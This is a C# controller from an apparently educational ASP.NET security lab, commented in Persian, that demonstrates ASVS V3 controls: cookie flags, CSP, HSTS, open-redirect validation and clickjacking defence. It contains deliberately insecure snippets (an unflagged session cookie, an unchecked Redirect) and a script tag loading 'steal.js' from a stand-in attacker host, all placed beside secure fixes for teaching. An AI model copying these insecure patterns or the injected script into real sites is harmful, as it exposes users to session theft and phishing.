using AsvsLab.Services;
using Microsoft.AspNetCore.Mvc;

namespace AsvsLab.Controllers;

// ═══════════════════════════════════════════════════════════════════
//  فصل V3 — امنیت فرانت‌اند وب (Web Frontend Security)
//  در ASVS 5.0 پرچم‌های کوکی از فصل نشست به این فصل منتقل شده‌اند
// ═══════════════════════════════════════════════════════════════════
public class V3Controller : DemoBaseController
{
    public V3Controller(AsvsRefService asvs, ProgressService progress) : base(asvs, progress) { }

    public IActionResult Index() =>
        SectionIndex(3, "این فصل شامل پرچم‌های کوکی، CSP، HSTS و Open Redirect است. هدرهای امنیتی برنامه در Program.cs به‌صورت سراسری تنظیم شده‌اند.");

    // ─────────────────────────────────────────────────────────────
    // دموی ۱: پرچم‌های کوکی — بندهای V3.3.1 تا V3.3.4
    // ─────────────────────────────────────────────────────────────
    public IActionResult CookieFlags()
    {
        var r = New("v3-cookie", "V3.3.1,V3.3.2,V3.3.3,V3.3.4",
            "کوکی‌ها باید Secure، SameSite مناسب، HttpOnly (برای توکن‌ها) و ترجیحاً با پیشوند __Host- باشند.", "V3");
        r.VulnerableCode = """
            // ❌ ناامن: کوکی بدون هیچ پرچم امنیتی
            Response.Cookies.Append("session", token);
            // قابل خواندن با JS (سرقت با XSS)، قابل ارسال در HTTPS آشکار،
            // قابل استفاده در CSRF
            """;
        r.SecureCode = """
            // ✅ امن: همه پرچم‌ها فعال (روی HTTPS نام __Host- را بگذارید)
            Response.Cookies.Append("session", token, new CookieOptions
            {
                HttpOnly = true,   // V3.3.4 — جاوااسکریپت نمی‌خواند
                Secure = true,     // V3.3.1 — فقط HTTPS
                SameSite = SameSiteMode.Strict, // V3.3.2 — ضد CSRF
                MaxAge = TimeSpan.FromMinutes(15)
            });
            """;

        // اجرای واقعی: ست کردن کوکی با پرچم‌های امن + نمایش هدر خام
        Response.Cookies.Append("AsvsLab.SecureDemo", "demo-value", new CookieOptions
        {
            HttpOnly = true,
            SameSite = SameSiteMode.Strict
            // Secure=true روی localhost بدون HTTPS کوکی را از کار می‌اندازد؛ در تولید حتماً فعال شود
        });
        var setCookie = Response.Headers["Set-Cookie"].ToString();

        r.OutputLines.Add("هدر Set-Cookie واقعی که همین درخواست تولید کرد:");
        r.OutputLines.Add($"  {setCookie}");
        r.OutputLines.Add($"کوکی احراز هویت برنامه: HttpOnly=true, SameSite=Lax (در Program.cs)");
        r.OutputLines.Add("بند V3.3.3: روی HTTPS نام کوکی را «__Host-session» بگذارید تا دامنه/مسیر قفل شود.");
        return View("../Shared/DemoResult", r);
    }

    // ─────────────────────────────────────────────────────────────
    // دموی ۲: هدر CSP — بند V3.4.3 (میان‌افزار Program.cs)
    // ─────────────────────────────────────────────────────────────
    public IActionResult CspHeader()
    {
        var r = New("v3-csp", "V3.4.3",
            "پاسخ‌ها باید CSP داشته باشند تا مرورگر فقط محتوای مورد اعتماد بارگذاری و اجرا کند (کاهش اثر XSS).", "V3");
        r.VulnerableCode = """
            // ❌ ناامن: بدون CSP — هر <script src="attacker.com"> اجرا می‌شود
            <script src="https://evil.example.com/steal.js"></script>
            """;
        r.SecureCode = """
            // ✅ امن: CSP سخت‌گیرانه (در Program.cs این برنامه فعال است)
            Content-Security-Policy: default-src 'self'; script-src 'self';
                style-src 'self' 'unsafe-inline'; frame-ancestors 'none'
            """;
        var current = Response.Headers["Content-Security-Policy"].ToString();
        r.OutputLines.Add($"هدر CSP فعال این پاسخ:");
        r.OutputLines.Add($"  {current}");
        r.OutputLines.Add("آزمایش: یک تگ اسکریپت خارجی به صفحه تزریق کنید — مرورگر بارگذاری را مسدود می‌کند.");
        return View("../Shared/DemoResult", r);
    }

    // ─────────────────────────────────────────────────────────────
    // دموی ۳: HSTS — بند V3.4.1
    // ─────────────────────────────────────────────────────────────
    public IActionResult HstsHeader()
    {
        var r = New("v3-hsts", "V3.4.1",
            "همه پاسخ‌ها باید هدر Strict-Transport-Security داشته باشند (حداکثر عمر حداقل ۱ سال) تا HTTPS اجباری شود.", "V3");
        r.VulnerableCode = """
            // ❌ ناامن: بدون HSTS — اولین درخواست http:// قابل شنود و SSL Strip است
            """;
        r.SecureCode = """
            // ✅ امن: اجبار HSTS در پیکربندی
            app.UseHsts(); // Strict-Transport-Security: max-age=31536000; includeSubDomains
            """;
        Response.Headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains";
        r.OutputLines.Add($"هدر HSTS این پاسخ: {Response.Headers["Strict-Transport-Security"]}");
        r.OutputLines.Add("نکته: HSTS فقط روی HTTPS معنا دارد؛ روی localhost با http صرفاً آموزشی است.");
        r.OutputLines.Add("بند V3.7.4 (سطح ۳): افزودن دامنه به فهرست Preload مرورگرها.");
        return View("../Shared/DemoResult", r);
    }

    // ─────────────────────────────────────────────────────────────
    // دموی ۴: Open Redirect — بند V3.7.2 (فرم تعاملی)
    // ─────────────────────────────────────────────────────────────
    [HttpGet] public IActionResult OpenRedirect() => FormView("v3-redirect", "url", "آدرس مقصد بعد از ورود", "مثال: /Profile یا https://evil.example.com");

    [HttpPost]
    [ValidateAntiForgeryToken]
    public IActionResult OpenRedirect(string url)
    {
        var r = New("v3-redirect", "V3.7.2",
            "هدایت خودکار به دامنه خارجی فقط با اعتبارسنجی مقصد مجاز است؛ در غیر این صورت فیشینگ رخ می‌دهد.", "V3");
        r.VulnerableCode = """
            // ❌ ناامن: هدایت بدون بررسی — فیشینگ با URL معتبر شما!
            return Redirect(returnUrl);
            """;
        r.SecureCode = """
            // ✅ امن: فقط آدرس‌های داخلی مجازند
            if (Url.IsLocalUrl(returnUrl)) return LocalRedirect(returnUrl);
            return RedirectToAction("Index", "Home");
            """;
        var target = string.IsNullOrWhiteSpace(url) ? "https://evil.example.com/steal" : url;
        var isLocal = Url.IsLocalUrl(target);
        r.OutputLines.Add($"مقصد پیشنهادی: «{target}»");
        r.OutputLines.Add(isLocal
            ? "✅ مقصد داخلی است → هدایت مجاز است (LocalRedirect)"
            : "🚫 مقصد خارجی است → هدایت رد شد و کاربر به صفحه اصلی برمی‌گردد");
        r.OutputLines.Add("نکته: صفحه ورود واقعی برنامه (Account/Login) دقیقاً همین بررسی را روی returnUrl دارد.");
        return View("../Shared/DemoResult", r);
    }

    // ─────────────────────────────────────────────────────────────
    // دموی متنی: Clickjacking — بند V3.4.3 (frame-ancestors)
    // ─────────────────────────────────────────────────────────────
    public IActionResult Clickjacking() =>
        View("../Shared/DemoResult", TextDemo("v3-clickjack", "V3.4.3",
            "با دستور frame-ancestors در CSP (و X-Frame-Options) جلوی نمایش سایت در iframe مهاجم گرفته می‌شود.", "V3",
            "برنامه فعلی هر دو هدر را سراسری ست می‌کند (ببینید Program.cs):\n\n" +
            "Content-Security-Policy: ... frame-ancestors 'none'\n" +
            "X-Frame-Options: DENY\n\n" +
            "سناریوی حمله: مهاجم سایت شما را در iframe نامرئی قرار می‌دهد و با لایه‌های فریبنده، " +
            "کاربر را وادار به کلیک روی دکمه‌های حساس («حذف حساب») می‌کند. با frame-ancestors 'none' مرورگر بارگذاری در iframe را مسدود می‌کند. " +
            "اجرای «واقعی» این دمو در مرورگر است: با DevTools سعی کنید این صفحه را داخل iframe دیگری بیاورید و خطای CSP را در Console ببینید."));
}
